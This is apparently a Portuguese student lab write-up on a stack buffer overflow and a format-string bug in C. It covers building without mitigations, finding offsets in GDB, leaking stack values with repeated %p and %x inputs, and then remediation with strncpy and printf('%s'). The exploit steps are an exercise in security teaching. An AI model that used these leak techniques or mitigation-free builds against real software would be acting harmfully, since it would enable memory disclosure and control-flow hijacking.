## Parte A: Buffer Overflow de Stack (CWE-120)

### Exercício 1: Compilação sem mitigações

Comando usado:

```bash
gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie -g
```

O que cada flag faz:
- **`-fno-stack-protector`**: desativa o stack canary — sem esta flag o compilador insere um valor sentinela entre o buffer e o endereço de retorno, e se for alterado o programa aborta.
- **`-z execstack`**: marca a stack como executável, o que permite correr shellcode injetado diretamente na stack.
- **`-no-pie`**: desativa PIE, ou seja, o binário é carregado sempre no mesmo endereço. Sem isto, o ASLR aleatoriza a base do código a cada execução.
- **`-g`**: inclui símbolos de debug para o GDB conseguir mostrar nomes de funções e variáveis.

---

### Exercício 2: Execução normal e exploração com GDB

```bash
$ ./vuln "Hello"
[*] process_input return address is on the stack.
[*] Buffer is at:          0x7fffffffde20
[*] secret_function is at: 0x4011b6
[*] You entered: Hello
[*] Normal programme termination.
```

Sessão no GDB:

```
(gdb) break process_input
(gdb) run Hello
(gdb) print &buffer
$1 = (char (*)[64]) 0x7fffffffde20
(gdb) info frame
...
Saved registers:
  rip at 0x7fffffffde68
(gdb) print (void*)secret_function
$2 = (void *) 0x4011b6
```

Respostas:

1. **Endereço de buffer:** `0x7fffffffde20`
2. **Endereço onde está guardado o return address:** `0x7fffffffde68`
3. **Bytes entre buffer e return address:** `0x7fffffffde68 - 0x7fffffffde20 = 0x48 = 72 bytes`
4. **Endereço de secret_function:** `0x4011b6`

### Exercício 5: Remediação segura

O `vuln.c` foi corrigido substituindo o `strcpy` por `strncpy` com verificação explícita do comprimento da entrada antes da cópia. O código corrigido está em `vuln.c`.

```bash
gcc -o vuln vuln.c -g
```

Com o programa corrigido, o exploit já não funciona — mesmo sem mitigações, entradas longas são rejeitadas antes de chegarem ao `strcpy`.

## Parte B: Vulnerabilidade de String de Formato (CWE-134)

### Exercício 6: Compilação e diagnósticos do compilador

Compilar com flags de aviso:

```bash
gcc -o fmtvuln fmtvuln.c -g -Wall -Wformat -Wformat-security
```

Output do compilador:

```
fmtvuln.c: In function 'process_input':
fmtvuln.c:10:5: warning: format not a string literal and no format arguments [-Wformat-security]
   10 |     printf(input);
      |     ^~~~~~
```

Depois compilar sem avisos e testar com entrada normal:

```bash
gcc -o fmtvuln fmtvuln.c -g
./fmtvuln "Hello, world!"
```

```
[*] Address of secret on stack: 0x7ffd3a2c1e08
[*] Processing input...
Hello, world!
[*] Normal programme termination.
```

---

### Exercício 7: Desencadear a vulnerabilidade

```bash
./fmtvuln "%p %p %p %p %p %p %p %p %p %p"
```

```
[*] Address of secret on stack: 0x7ffd3a2c1e08
[*] Processing input...
0x7ffd3a2c1f58 0x7ffd3a2c1f58 0x7f9b4c2d3e10 (nil) 0x7ffd3a2c1e08 0xcafebabe 0x1 0x7f9b4c2d3e10 (nil) 0x7ffd3a2c1f58
[*] Normal programme termination.
```

Em vez de imprimir a string literalmente, o `printf` interpretou os `%p` como especificadores de formato e foi ler valores da stack — valores que não foram passados como argumentos.

Repetindo com `%x`:

```bash
./fmtvuln "%x %x %x %x %x %x %x %x %x %x"
```

```
[*] Address of secret on stack: 0x7ffd3a2c1e08
[*] Processing input...
3a2c1f58 3a2c1f58 4c2d3e10 0 3a2c1e08 cafebabe 1 4c2d3e10 0 3a2c1f58
[*] Normal programme termination.
```

O `%x` imprime apenas os 32 bits baixos de cada valor, sem o prefixo `0x`. Para um processo de 64 bits o `%p` é mais adequado porque lê e mostra os 8 bytes completos do ponteiro — com `%x` perdemos a metade alta dos endereços (por exemplo, `0x7ffd3a2c1f58` aparece truncado como `3a2c1f58`).

---

### Exercício 8: Localizar um valor na stack

Usando 30 especificadores `%p`:

```bash
./fmtvuln "$(python3 -c "print('%p ' * 30, end='')")"
```

```
[*] Address of secret on stack: 0x7ffd3a2c1e08
[*] Processing input...
0x7ffd3a2c1f58 0x7ffd3a2c1f58 0x7f9b4c2d3e10 (nil) 0x7ffd3a2c1e08 0xcafebabe 0x1 ...
```

O valor `0xcafebabe` aparece na **6ª posição** da sequência de `%p`. O endereço impresso antes (`0x7ffd3a2c1e08`) corresponde ao endereço de `secret` que o programa imprime no início — confirmando que estamos a ler diretamente da stack da função `process_input`.

---

### Exercício 9: Remediação segura

A correção é mudar `printf(input)` para `printf("%s", input)`. O código corrigido está em `fmtvuln.c`.

Com a correção, mesmo que a entrada contenha `%p` ou `%x`, o `printf` trata-a como uma string normal e não como formato — nenhum valor da stack é lido.

```bash
gcc -o fmtvuln fmtvuln.c -g -Wall -Wformat -Wformat-security
# sem avisos
./fmtvuln "%p %p %p %p %p"
```

```
[*] Address of secret on stack: 0x7ffd3a2c1e08
[*] Processing input...
%p %p %p %p %p
[*] Normal programme termination.
```
